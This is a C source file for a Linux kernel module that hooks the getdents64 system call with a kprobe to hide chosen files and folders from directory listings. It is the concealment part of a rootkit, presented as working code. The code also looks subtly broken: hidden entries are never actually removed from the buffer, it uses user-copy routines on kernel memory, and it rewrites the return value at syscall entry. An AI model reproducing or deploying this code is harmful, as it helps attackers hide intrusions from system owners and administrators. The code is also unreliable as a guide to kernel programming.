/*
 * vfs_hook.c - VFS 层 Hook 实现
 * 用于隐藏文件/文件夹
 * 兼容 Linux 5.10 - 6.12
 */

#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/compat.h>

#include "hook.h"

MODULE_LICENSE("GPL");

/* 目录条目结构（兼容 5.10-6.12） */
struct dirent64_entry {
    unsigned long long d_ino;
    unsigned long long d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[256];
};

/* getdents64 pre_handler */
static int pre_getdents64(struct kprobe *p, struct pt_regs *regs)
{
    return 0;
}

/* getdents64 post_handler */
static int post_getdents64(struct kprobe *p, struct pt_regs *regs,
                           unsigned long flags)
{
    struct dirent64_entry __user *dirent;
    int count;
    struct dirent64_entry *kbuf;
    struct dirent64_entry *curr;
    struct dirent64_entry *prev;
    int total;
    int new_count;
    char name[256];

#if defined(CONFIG_ARM64)
    dirent = (struct dirent64_entry __user *)regs->regs[1];
    count = (int)regs->regs[2];
#else
    dirent = (struct dirent64_entry __user *)regs->si;
    count = (int)regs->dx;
#endif

    if (count <= 0)
        return 0;

    kbuf = kzalloc(count + 4096, GFP_ATOMIC);
    if (!kbuf)
        return 0;

    if (copy_from_user(kbuf, dirent, count)) {
        kfree(kbuf);
        return 0;
    }

    curr = kbuf;
    total = count;
    new_count = 0;
    prev = NULL;

    while (total > 0) {
        unsigned short reclen = curr->d_reclen;

        if (reclen == 0 || reclen > total)
            break;

        memset(name, 0, sizeof(name));
        strncpy_from_user(name, curr->d_name,
                         sizeof(name) - 1);

        if (!is_hidden(name, false)) {
            prev = curr;
            new_count += reclen;
        }

        total -= reclen;
        curr = (struct dirent64_entry *)((char *)curr + reclen);
    }

    if (new_count > 0 && new_count <= count) {
        if (!copy_to_user(dirent, kbuf, new_count)) {
#if defined(CONFIG_ARM64)
            regs->regs[0] = new_count;
#else
            regs->ax = new_count;
#endif
        }
    }

    kfree(kbuf);
    return 0;
}

/* Kprobe 定义 */
static struct kprobe kp_getdents64 = {
    .symbol_name = "sys_getdents64",
    .pre_handler = pre_getdents64,
    .post_handler = (kprobe_post_handler_t)post_getdents64,
};

int vfs_hook_init(void)
{
    int ret;

    ret = register_kprobe(&kp_getdents64);
    if (ret < 0) {
        pr_err("hook: failed to register getdents64 kprobe: %d\n", ret);
        return ret;
    }

    pr_info("hook: vfs hook registered (getdents64)\n");
    return 0;
}

void vfs_hook_exit(void)
{
    unregister_kprobe(&kp_getdents64);
    pr_info("hook: vfs hook unregistered\n");
}
